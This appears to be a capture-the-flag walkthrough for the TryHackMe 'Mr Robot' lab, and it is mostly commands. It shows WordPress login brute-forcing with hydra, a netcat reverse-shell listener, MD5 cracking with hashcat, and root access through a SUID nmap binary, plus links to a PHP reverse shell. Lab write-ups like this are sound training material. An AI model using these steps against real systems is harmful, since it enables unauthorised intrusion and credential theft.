---
description: https://tryhackme.com/room/mrrobot
---

# Mr Robot CTF

### **What is key 1?**

```
nmap 10.10.237.105
gobuster dir -u http://10.10.237.105 \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 12-24-00.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-16 09-17-57.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-16 09-32-16.png>)

```
curl http://10.10.237.105/robots
curl http://10.10.237.105/key-1-of-3.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 09-14-21.png>)

```
wget http://10.10.237.105/fsocity.dic
sort -u fsocity.dic -o fsocity.dic
```

### **What is key 2?**

```
hydra -L fsocity.dic -p password \
      'http-post-form://10.10.114.171/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username' \
      -I -f -V -t64
hydra -l ELLIOT  -P fsocity.dic \
      'http-post-form://10.10.114.171/wp-login.php:log=^USER^&pwd=^PASS^:incorrect' \
      -I -f -V -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 11-14-37.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-16 11-43-21.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-16 12-05-07.png>)

```
nc -nvlp 4444
$ find / -name key-2-of-3.txt 2>/dev/null
$ ls -l /home/robot
$ cat /home/robot/password.raw-md5
```

```
echo -n 'c3fcd3d76192e4007dfb496cca67e13b' > md5.txt
hashcat -a 0 -m 0 md5.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 12-08-05.png>)

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ su - robot
$ cat key-2-of-3.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 12-15-06.png>)

### **What is key 3?**

```
$ find / -perm -4000 2>/dev/null
$ /usr/local/bin/nmap -iL /root/key-3-of-3.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 12-21-25.png>)

## :link: Support Material

{% embed url="https://rioasmara.com/2019/02/25/penetration-test-wordpress-reverse-shell/" %}

{% embed url="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" %}

